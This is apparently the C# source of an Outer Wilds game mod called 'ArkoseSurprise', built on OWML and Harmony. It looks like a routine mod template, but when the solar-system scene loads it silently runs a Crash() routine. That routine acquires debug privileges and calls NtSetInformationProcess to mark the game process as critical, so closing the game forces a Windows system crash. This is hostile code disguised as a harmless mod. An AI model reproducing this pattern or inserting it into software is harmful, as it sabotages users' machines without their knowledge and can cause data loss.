using HarmonyLib;
using OWML.Common;
using OWML.ModHelper;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ArkoseSurprise;

[HarmonyPatch]
public class ArkoseSurprise : ModBehaviour
{
	private void Awake()
	{
		Harmony.CreateAndPatchAll(Assembly.GetExecutingAssembly());
	}

	private void Start()
	{
		// Starting here, you'll have access to OWML's mod helper.
		ModHelper.Console.WriteLine($"My mod {nameof(ArkoseSurprise)} is loaded!", MessageType.Success);


		// Example of accessing game code.
		LoadManager.OnCompleteSceneLoad += (scene, loadScene) =>
		{
			if (loadScene != OWScene.SolarSystem) return;
			ModHelper.Console.WriteLine("Loaded into solar system!", MessageType.Success);

			Crash();
		};
	}


	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	private static void Crash()
	{
		int isCritical = 1; // we want this to be a Critical Process
		int BreakOnTermination = 0x1D; // value for BreakOnTermination (flag)

		Process.EnterDebugMode(); //acquire Debug Privileges

		// setting the BreakOnTermination = 1 for the current process
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
	}
}
